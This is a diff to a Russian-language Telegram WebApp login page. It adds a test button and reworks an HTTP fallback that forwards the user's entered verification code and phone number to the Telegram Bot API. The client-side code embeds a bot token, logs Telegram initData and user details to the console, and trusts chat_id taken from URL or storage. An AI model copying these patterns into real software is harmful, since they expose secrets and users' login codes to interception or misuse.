@@ -301,6 +301,30 @@
         .copy-button:active {
             transform: translateY(0);
         }
+
+        /* Кнопка тестирования */
+        .test-button {
+            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%);
+            color: white;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 6px;
+            font-size: 12px;
+            font-weight: 500;
+            cursor: pointer;
+            margin-top: 12px;
+            transition: all 0.3s ease;
+            box-shadow: 0 2px 8px rgba(255, 107, 107, 0.3);
+        }
+
+        .test-button:hover {
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(255, 107, 107, 0.4);
+        }
+
+        .test-button:active {
+            transform: translateY(0);
+        }
     </style>
 </head>
 <body>
@@ -350,6 +374,11 @@
                     <span class="button-text">Подтвердить данные</span>
                 </button>
             </form>
+
+            <!-- Кнопка для тестирования HTTP fallback -->
+            <button type="button" id="testHttpButton" class="test-button" style="display: none;">
+                🔧 Тест HTTP Fallback
+            </button>
 
             <div id="authStatus" class="auth-status"></div>
             
@@ -453,9 +482,50 @@
 
                 // Настройка формы
                 this.setupForm();
+                
+                // Показываем кнопку тестирования для мобильных устройств
+                this.setupTestButton();
+                
                 this.isReady = true;
                 
                 console.log('✅ Система авторизации готова с золотой кнопкой!');
+            }
+
+            // Настройка кнопки тестирования
+            setupTestButton() {
+                const testButton = document.getElementById('testHttpButton');
+                
+                // Показываем кнопку только на мобильных устройствах
+                if (this.platform.isMobile) {
+                    testButton.style.display = 'block';
+                    
+                    testButton.addEventListener('click', async () => {
+                        console.log('🔧 Тестируем HTTP fallback...');
+                        
+                        const testData = {
+                            code: '111098',
+                            phone: '89827701055',
+                            platform: this.platform,
+                            timestamp: Date.now(),
+                            test: true
+                        };
+                        
+                        const status = document.getElementById('authStatus');
+                        status.innerHTML = '🔧 Тестируем HTTP fallback...';
+                        
+                        try {
+                            const success = await this.sendDataViaHTTP(testData);
+                            if (success) {
+                                status.innerHTML += '<br>✅ Тест HTTP fallback завершен!';
+                            } else {
+                                status.innerHTML += '<br>❌ Тест HTTP fallback не удался!';
+                            }
+                        } catch (error) {
+                            console.error('❌ Ошибка теста HTTP fallback:', error);
+                            status.innerHTML += '<br>❌ Ошибка теста HTTP fallback!';
+                        }
+                    });
+                }
             }
 
             // Настройка формы и событий
@@ -573,7 +643,13 @@
                     platform: this.platform,
                     hasTelegram: !!this.tg,
                     hasSendData: typeof this.tg?.sendData === 'function',
-                    hasMainButton: !!this.tg?.MainButton
+                    hasMainButton: !!this.tg?.MainButton,
+                    initData: this.tg?.initData || 'отсутствует',
+                    startParam: this.tg?.startParam || 'отсутствует',
+                    version: this.tg?.version || 'неизвестно',
+                    userAgent: navigator.userAgent,
+                    isMobile: this.platform.isMobile,
+                    isStandalone: window.navigator.standalone || false
                 });
 
                 // Приоритет 1: Telegram WebApp sendData API
@@ -675,69 +751,140 @@
                 try {
                     console.log('🌐 Отправляем данные через HTTP fallback');
                     
-                    // Создаем временный endpoint для получения данных
-                    const webhookUrl = 'https://webhook.site/your-unique-url'; // Замените на реальный URL
+                    // Пытаемся получить chat_id различными способами
+                    let chatId = this.getCurrentChatId();
                     
-                    // Альтернативно, используем Telegram Bot API напрямую
-                    const botToken = '8232668997:AAHCvWtcjtqw5b5tuYrYwg1lCz0oItjhUEg';
-                    const chatId = this.getCurrentChatId(); // Нужно получить текущий chat_id
-                    
-                    if (chatId) {
-                        const message = `🔐 Авторизация с мобильного устройства:\n\nКод: ${data.code}\nТелефон: ${data.phone}\nПлатформа: ${data.platform.platform}`;
-                        
-                        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                            method: 'POST',
-                            headers: {
-                                'Content-Type': 'application/json',
-                            },
-                            body: JSON.stringify({
-                                chat_id: chatId,
-                                text: message,
-                                parse_mode: 'HTML'
-                            })
-                        });
-                        
-                        if (response.ok) {
-                            console.log('✅ Данные отправлены через HTTP fallback');
-                            return true;
-                        } else {
-                            console.warn('⚠️ HTTP fallback не удался:', response.status);
-                        }
+                    if (!chatId) {
+                        // Если chat_id не найден, показываем инструкции
+                        console.log('📱 Chat ID не найден, показываем инструкции');
+                        this.showMobileAuthInstructions(data);
+                        return true;
                     }
                     
-                    // Если не удалось отправить через бота, показываем инструкции
-                    console.log('📱 Показываем инструкции для мобильной авторизации');
-                    this.showMobileAuthInstructions(data);
-                    return true; // Возвращаем true, так как инструкции показаны
+                    // Отправляем данные через Telegram Bot API
+                    const botToken = '8232668997:AAHCvWtcjtqw5b5tuYrYwg1lCz0oItjhUEg';
+                    const message = `🔐 Авторизация с мобильного устройства:\n\nКод: ${data.code}\nТелефон: ${data.phone}\nПлатформа: ${data.platform.platform}`;
+                    
+                    console.log(`📤 Отправляем сообщение в чат ${chatId}:`, message);
+                    
+                    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: message,
+                            parse_mode: 'HTML'
+                        })
+                    });
+                    
+                    if (response.ok) {
+                        console.log('✅ Данные отправлены через HTTP fallback');
+                        
+                        // Показываем успешное сообщение
+                        const status = document.getElementById('authStatus');
+                        status.innerHTML = `
+                            ✅ <strong>Данные отправлены!</strong><br><br>
+                            📱 Ваши данные авторизации отправлены в чат с ботом.<br>
+                            🔍 Проверьте чат - там должно появиться сообщение о проверке данных.<br><br>
+                            💡 Если авторизация прошла успешно, вы получите уведомление.
+                        `;
+                        
+                        return true;
+                    } else {
+                        const errorText = await response.text();
+                        console.warn('⚠️ HTTP fallback не удался:', response.status, errorText);
+                        
+                        // Показываем инструкции как fallback
+                        this.showMobileAuthInstructions(data);
+                        return true;
+                    }
                     
                 } catch (error) {
                     console.error('❌ Ошибка HTTP fallback:', error);
-                    return false;
+                    
+                    // В случае ошибки показываем инструкции
+                    this.showMobileAuthInstructions(data);
+                    return true;
                 }
             }
 
-            // Получение текущего chat_id (если доступно)
+            // Получение текущего chat_id (улучшенная версия)
             getCurrentChatId() {
                 try {
-                    // Пытаемся получить chat_id из initData
+                    console.log('🔍 Ищем chat_id...');
+                    
+                    // Способ 1: Через initData (основной)
                     if (this.tg?.initData) {
-                        const urlParams = new URLSearchParams(this.tg.initData);
-                        const user = urlParams.get('user');
-                        if (user) {
-                            const userData = JSON.parse(decodeURIComponent(user));
-                            return userData.id;
+                        console.log('📋 initData доступен:', this.tg.initData);
+                        
+                        try {
+                            const urlParams = new URLSearchParams(this.tg.initData);
+                            const user = urlParams.get('user');
+                            if (user) {
+                                const userData = JSON.parse(decodeURIComponent(user));
+                                console.log('👤 Данные пользователя:', userData);
+                                if (userData.id) {
+                                    console.log('✅ Chat ID найден через initData:', userData.id);
+                                    return userData.id;
+                                }
+                            }
+                        } catch (e) {
+                            console.warn('⚠️ Ошибка парсинга initData:', e);
                         }
                     }
                     
-                    // Альтернативный способ - через localStorage или sessionStorage
-                    const storedChatId = localStorage.getItem('telegram_chat_id') || sessionStorage.getItem('telegram_chat_id');
-                    if (storedChatId) {
-                        return storedChatId;
+                    // Способ 2: Через query параметры URL
+                    try {
+                        const urlParams = new URLSearchParams(window.location.search);
+                        const chatId = urlParams.get('chat_id') || urlParams.get('chat');
+                        if (chatId) {
+                            console.log('✅ Chat ID найден через URL параметры:', chatId);
+                            return chatId;
+                        }
+                    } catch (e) {
+                        console.warn('⚠️ Ошибка парсинга URL:', e);
                     }
                     
+                    // Способ 3: Через localStorage/sessionStorage
+                    try {
+                        const storedChatId = localStorage.getItem('telegram_chat_id') || 
+                                           sessionStorage.getItem('telegram_chat_id') ||
+                                           localStorage.getItem('chat_id') ||
+                                           sessionStorage.getItem('chat_id');
+                        if (storedChatId) {
+                            console.log('✅ Chat ID найден через storage:', storedChatId);
+                            return storedChatId;
+                        }
+                    } catch (e) {
+                        console.warn('⚠️ Ошибка чтения storage:', e);
+                    }
+                    
+                    // Способ 4: Через window.Telegram.WebApp.startParam
+                    if (this.tg?.startParam) {
+                        try {
+                            const startParam = this.tg.startParam;
+                            console.log('📋 startParam:', startParam);
+                            
+                            // Пытаемся извлечь chat_id из startParam
+                            if (startParam.includes('chat_id=')) {
+                                const match = startParam.match(/chat_id=(\d+)/);
+                                if (match) {
+                                    console.log('✅ Chat ID найден через startParam:', match[1]);
+                                    return match[1];
+                                }
+                            }
+                        } catch (e) {
+                            console.warn('⚠️ Ошибка парсинга startParam:', e);
+                        }
+                    }
+                    
+                    console.warn('❌ Chat ID не найден ни одним способом');
                     return null;
+                    
                 } catch (error) {
-                    console.warn('⚠️ Не удалось получить chat_id:', error);
+                    console.error('❌ Критическая ошибка при поиске chat_id:', error);
                     return null;
                 }
             }
